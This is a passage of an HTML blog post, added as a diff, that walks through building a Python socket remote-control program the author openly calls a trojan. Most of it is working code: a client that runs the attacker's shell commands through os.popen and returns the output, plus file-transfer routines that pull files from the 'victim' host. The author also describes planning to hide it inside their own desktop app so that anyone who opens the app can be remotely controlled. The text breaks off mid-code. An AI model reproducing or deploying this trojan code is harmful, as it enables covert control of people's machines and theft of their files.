@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>基于Socket的远程控制程序 | Pi3's Notebook</title><meta name="author" content="LiuChao"><meta name="copyright" content="LiuChao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一个由Python语言编写的基于Socket的远程控制程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于Socket的远程控制程序">
+<meta property="og:url" content="https://pi3yyy.love/archives/6cb7cff5.html">
+<meta property="og:site_name" content="Pi3&#39;s Notebook">
+<meta property="og:description" content="一个由Python语言编写的基于Socket的远程控制程序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/2.jpg">
+<meta property="article:published_time" content="2023-11-29T15:28:00.000Z">
+<meta property="article:modified_time" content="2023-12-20T13:35:00.000Z">
+<meta property="article:author" content="LiuChao">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Socket">
+<meta property="article:tag" content="远程控制">
+<meta property="article:tag" content="远控木马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/2.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/pi3.png"><link rel="canonical" href="https://pi3yyy.love/archives/6cb7cff5.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="VawN-8WG_4bj-ToUYin2KVDZV20YU4VwRZNYyJ2mhpo"/><meta name="baidu-site-verification" content="codeva-NffhRTbji8"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a8ae34c41457a14d356310f67e84e435";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "jvasgyk9yi");</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":2,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: LiuChao","link":"链接: ","source":"来源: Pi3's Notebook","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#957DAD","bgDark":"#E0BBE4","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '基于Socket的远程控制程序',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-20 21:35:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Pi3's Notebook"><span class="site-name">Pi3's Notebook</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基于Socket的远程控制程序</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-29T15:28:00.000Z" title="发表于 2023-11-29 23:28:00">2023-11-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-20T13:35:00.000Z" title="更新于 2023-12-20 21:35:00">2023-12-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF%E6%95%99%E7%A8%8B/">技术教程</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="基于Socket的远程控制程序"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Python远程控制程序"><a href="#Python远程控制程序" class="headerlink" title="Python远程控制程序"></a>Python远程控制程序</h1><blockquote>
+<p>一个基于Python Socket 实现远程控制程序<br>可以用作远控木马</p>
+</blockquote>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>实现的功能：</p>
+<ul>
+<li>远程命令执行</li>
+<li>远程文件上传</li>
+<li>远程文件下载</li>
+<li>获取远程主机截屏</li>
+</ul>
+<p>在学习网络安全技术的过程中，了解到了计算机病毒、蠕虫和木马等知识，这其中木马应该是最好实现的一个，于是便想到写一个木马<br>在众多木马的类型中，结合学习到的网络编程知识，于是便有了这一个基于Socket实现的远程控制程序<br>在后续，可以将这个远控程序写入其他客户端程序中（比如之前的量子加密网盘项目），只要对方打开了桌面程序，就能远程连接</p>
+<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="最简单的Socket程序"><a href="#最简单的Socket程序" class="headerlink" title="最简单的Socket程序"></a>最简单的Socket程序</h3><p>首先，整个程序的框架就是基于Socket的TCP传输，先写一个最简单的Socket程序<br><strong>Server端：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">socket_server = socket.socket()</span><br><span class="line">socket_server.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8888</span>))</span><br><span class="line">socket_server.listen(<span class="number">1</span>)</span><br><span class="line">conn, address = socket_server.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;接收到客户端连接，来自<span class="subst">&#123;address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>).decode(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;接收到发来的消息：&#x27;</span>, data)</span><br><span class="line">    reply = <span class="built_in">input</span>(<span class="string">&#x27;请输入回复的消息：&#x27;</span>).encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">    conn.send(reply)</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">socket_server.close()</span><br></pre></td></tr></table></figure>
+
+<p><strong>Client端：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">socker_client = socket.socket()</span><br><span class="line">socker_client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;连接到服务端&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    send_msg = <span class="built_in">input</span>(<span class="string">&#x27;请输入要发送的消息：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> send_msg == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    socker_client.send(send_msg.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">    recv_data = socker_client.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;服务端回复的消息：&#x27;</span>, recv_data.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">socker_client.close()</span><br></pre></td></tr></table></figure>
+
+<p>以上是最简单的一个Socket程序，实现了两台主机之间相互传递文字信息。<br>但是在这个程序中，同样存在很多的问题，比如：</p>
+<ol>
+<li>传输的消息可能会超过1024</li>
+<li>没有任何异常抛出机制，在Socket通信的过程中，一定会存在丢包、失去连接、超时等问题</li>
+<li>…………<br>这些问题如果只是在上面这样一个简单程序中，基本不会有问题，但是一旦程序实现的功能多了，代码量大了，这些问题都至关重要，都需要在后续的代码中注意，不然找bug会很痛苦😢</li>
+</ol>
+<blockquote>
+<p>需要强调的是，在此程序中，我将服务端作为主动执行端，客户端作为被动执行端，也就是服务端发送指令，客户端根据指令进行操作并返回服务端<br>对于木马程序，同样可以理解为，服务端为攻击操纵者，客户端为攻击受害者<br>后续的介绍中，都是以此为基础</p>
+</blockquote>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>学会上面最简单的socket程序之后，接下来就是思考，怎么实现远程的命令执行<br>在这里我们可以使用Python中的os模块，os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性<br>Python中的os模块，理论上支持Windows、Linux和Mac OS系统，所以使用os模块，也可以增大我们编写的这个程序的使用范围<br>所以远程命令执行的整体流程和框架为：</p>
+<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
+  graph TB
+a(服务端等待客户端连接)--&gt;b(客户端连接上服务端)
+b--&gt;c(服务端接收到连接并发送指令)
+c--&gt;d(客户端解析指令并调用OS模块执行)
+  </pre></div>
+
+<p>使用os模块进行命令也十分简单，只需要使用<code>os.system(&#39;命令&#39;)</code>或者<code>os.popen(&#39;命令&#39;)</code>就可以实现，<br>但是但是，这里不能使用<code>os.system</code>，比如我们执行<code>dir</code>命令，需要返回文件夹内的内容，<font color="#00b0f0">它不能返回命令执行后的内容</font>，而<code>os.popen</code>可以</p>
+<blockquote>
+<p>补充：<br>python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen</code>都是可以实现系统命令的执行<br>但是他们之间也存在区别，<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172">参考文章</a><br>总结一下：</p>
+<ol>
+<li><code>os.system</code>直接调用标准C的system() 函数，仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息</li>
+<li><code>os.popen</code>不仅执行命令而且返回执行后的信息对象(常用于需要获取执行命令后的返回信息)，是通过一个管道文件将结果返回。返回的是 file read 的对象，对其进行读取<code>read</code>的操作可以看到执行的输出</li>
+<li><code>subprocess.popen</code>与<code>os.popen</code>类似，但是当执行命令的参数或者返回中包含了中文文字，更建议使用<code>subprocess</code></li>
+<li><code>commands</code>可以获取返回值和命令的输出结果</li>
+</ol>
+</blockquote>
+<p>所以在这个功能实现中，我选择使用<code>os.popen</code>方法来实现命令执行，使用<code>read</code>方法读取返回的内容<br><strong>Client端执行命令函数:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">socker_client, cmd</span>):  </span><br><span class="line">    pwd = os.getcwd()  </span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&#x27;cd&#x27;</span>):  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            os.chdir(cmd.split()[<span class="number">1</span>])  </span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:  </span><br><span class="line">            os.chdir(pwd)  </span><br><span class="line">            result = <span class="string">&#x27;目录不存在&#x27;</span>  </span><br><span class="line">            socker_client.send(result.encode(<span class="string">&#x27;UTF-8&#x27;</span>))  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        result = <span class="string">&#x27;切换目录成功&#x27;</span>  </span><br><span class="line">        socker_client.send(result.encode(<span class="string">&#x27;UTF-8&#x27;</span>))  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 执行命令  </span></span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        result = os.popen(cmd).read()  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        result = <span class="string">f&#x27;命令执行失败：<span class="subst">&#123;e&#125;</span>&#x27;</span>  </span><br><span class="line">    <span class="keyword">if</span> result == <span class="string">&#x27;&#x27;</span>:  </span><br><span class="line">        result = <span class="string">&#x27;命令执行成功&#x27;</span>  </span><br><span class="line">    <span class="comment"># 把命令回显结果发送给服务端  </span></span><br><span class="line">    socker_client.send(result.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>从上面这个函数实现代码中可以看到，我特意对<code>cd</code>切换目录命令做了单独的判断<br>这是因为在Python程序中直接执行<code>cd</code>切换目录是不起作用的，还是会返回当前程序运行的目录位置，所以需要使用<code>os.chdir</code>方法对当前Python程序运行的目录进行切换<br>除此之外的其他命令则没有进行单独的判断，直接交给<code>popen</code>执行，并用<code>read</code>方法读取返回信息</p>
+<blockquote>
+<p>值得注意的是，<code>popen</code>在执行其他命令会有意想不到的返回值，可能会不返回值，并且一直阻塞，需要根据实际情况单独判断</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214229.png" alt="远程执行命令"></p>
+<h3 id="远程下载文件"><a href="#远程下载文件" class="headerlink" title="远程下载文件"></a>远程下载文件</h3><p>远程下载文件，需要的是服务端和客户端紧密配合，并且保证通信过程中的同步<br>所谓同步，一定是<strong>一收一发</strong>的形式，不论是客户端还是服务端，一旦有一端出现了连续两次的发送或者接收，在实际的执行过程中，一定会出现死锁的现象，也就是双方都在等待对方发送消息，双方一直阻塞。<br>远程下载文件的整体流程和框架：</p>
+<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
+  graph TB
+a[服务端发送下载文件指令并指定文件名称]--&gt;b[客户端接收下载文件指令]
+b--&gt;c[客户端搜索文件是否存在]
+c--&gt;|存在|d[客户端读取文件数据并发送头部信息]
+c--&gt;|不存在|e[客户端向服务端发送不存在指令]
+d--&gt;f[服务端接收头部信息发送确认信息]
+e--&gt;h[双方退出下载文件流程]
+f--&gt;f1[客户端接收确认信息并发送文件数据]
+f1--&gt;f2[服务端接收文件数据并写入本地文件]
+  </pre></div>
+
+<p>这其中有一步是发送和确认文件的头部信息，这是为了告诉服务端所要接收的文件的文件大小和名称，以便写入文件。<br>当然这一步是可以省略的，服务端可以根据输入的指令信息得知文件的名称<br>在此程序中，使用<code>get 文件名称</code>的方式告诉双方，我需要进行下载文件的流程<br><strong>Server端get函数：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">conn</span>):  </span><br><span class="line">    <span class="comment"># 文件不存在的情况  </span></span><br><span class="line">    rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">    <span class="keyword">if</span> rev == <span class="string">b&#x27;file_not_exist&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件不存在&#x27;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    conn.send(<span class="string">b&#x27;start&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 接收文件头部大小  </span></span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        rev = conn.recv(<span class="number">4</span>)  </span><br><span class="line">        header_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, rev)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">except</span> (struct.error, ConnectionResetError):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;在接收文件头部长度时发生错误&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 发送确认消息  </span></span><br><span class="line">    conn.send(<span class="string">b&#x27;size_ok&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 接收文件头部信息  </span></span><br><span class="line">    header_bytes = conn.recv(header_size).decode(<span class="string">&#x27;UTF-8&#x27;</span>)  </span><br><span class="line">    header = json.loads(header_bytes)  </span><br><span class="line">    file_name = header[<span class="string">&#x27;file_name&#x27;</span>]  </span><br><span class="line">    file_size = header[<span class="string">&#x27;file_size&#x27;</span>]  </span><br><span class="line">    <span class="comment"># 发送确认消息  </span></span><br><span class="line">    conn.send(<span class="string">b&#x27;header_ok&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;文件名称：<span class="subst">&#123;file_name&#125;</span>，文件大小：<span class="subst">&#123;file_size&#125;</span> B&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始接收文件...&#x27;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            <span class="keyword">while</span> file_size &gt; <span class="number">0</span>:  </span><br><span class="line">                content = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">                file_size -= <span class="built_in">len</span>(content)  </span><br><span class="line">                f.write(content)  </span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;在写入文件时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;接收文件完成&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>Client端get函数：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">conn, file_name</span>):  </span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file_name):  </span><br><span class="line">        conn.send(<span class="string">b&#x27;file_exist&#x27;</span>)  </span><br><span class="line">        rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">        <span class="keyword">if</span> rev != <span class="string">b&#x27;start&#x27;</span>:  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        file_size = os.path.getsize(file_name)  </span><br><span class="line">        header = &#123;  </span><br><span class="line">            <span class="string">&#x27;file_name&#x27;</span>: file_name,  </span><br><span class="line">            <span class="string">&#x27;file_size&#x27;</span>: file_size  </span><br><span class="line">        &#125;  </span><br><span class="line">        header_json = json.dumps(header)  </span><br><span class="line">        header_bytes = header_json.encode(<span class="string">&#x27;UTF-8&#x27;</span>)  </span><br><span class="line">        header_size = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(header_bytes))  </span><br><span class="line">        conn.send(header_size)  </span><br><span class="line">        rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">        <span class="keyword">if</span> rev != <span class="string">b&#x27;size_ok&#x27;</span>:  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        conn.send(header_bytes)  </span><br><span class="line">        rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">        <span class="keyword">if</span> rev == <span class="string">b&#x27;header_ok&#x27;</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                    <span class="keyword">while</span> file_size &gt; <span class="number">0</span>:  </span><br><span class="line">                        content = f.read(<span class="number">1024</span>)  </span><br><span class="line">                        file_size -= <span class="built_in">len</span>(content)  </span><br><span class="line">                        conn.send(content)  </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;发送错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)  </span><br><span class="line">                conn.send(<span 